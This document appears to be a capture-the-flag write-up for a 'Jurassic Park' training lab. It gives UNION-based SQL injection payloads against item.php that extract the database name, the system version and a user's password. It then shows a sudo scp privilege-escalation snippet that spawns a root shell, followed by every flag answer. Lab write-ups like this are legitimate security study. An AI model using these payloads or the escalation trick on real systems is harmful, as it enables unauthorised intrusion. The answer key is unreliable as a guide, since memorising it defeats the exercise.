# JURASSIC PARK

## BASIC INFO 
```
export IP=10.10.79.179

```

Blocked character found on $IP/item.php?id=5
```
' # DROP - username @
```
Found SQLi with this.
`$IP/item.php?1 union select 1, 2, 3, 4, 5`

```
system username = root@localhost
system version = ubuntu 16.04

username = dennis
password = ih8dinos
```
## JURASSIC PARK CTF

> - **What is the SQL database called which is serving the shop information?**
>> park

`UNION SELECT 1, database(), 3, 4, 5`

> - **How many columns does the table have?**
>> 5

`UNION SELECT 1, 2, 3, 4, 5`

> - **Whats the system version?**
>> ubuntu 16.04

`UNION SELECT 1, system(), 3, 4, 5`

> - **What is dennis' password?**
>> ih8dinos

`UNION SELECT 1, password, 3, 4, 5 FROM users`

> - **Locate and get the first flag contents.**
>> b89f2d69c56b9981ac92dd267f

`cat flag1.txt`

> - **Whats the contents of the second flag?**
>> 96ccd6b429be8c9a4b501c7a0b117b0a

Inside .viminfo there is the location of flag 2

> - **Whats the contents of the third flag?**
>> b4973bbc9053807856ec815db25fb3f1

Inside .bash_history

> - **There is no fourth flag.**
>> No asnwer needed

> - **Whats the contents of the fifth flag?**
>> 2a7074e491fcacc7eeba97808dc5e2ec

`sudo -l` to check what command we can run. Looks like we can run scp. Check on gtfobins.

```
TF=$(mktemp)
echo 'sh 0<&2 1>&2' > $TF
chmod +x "$TF"
sudo scp -S $TF x y:
```
Now we are root. `cat /root/flag5.txt`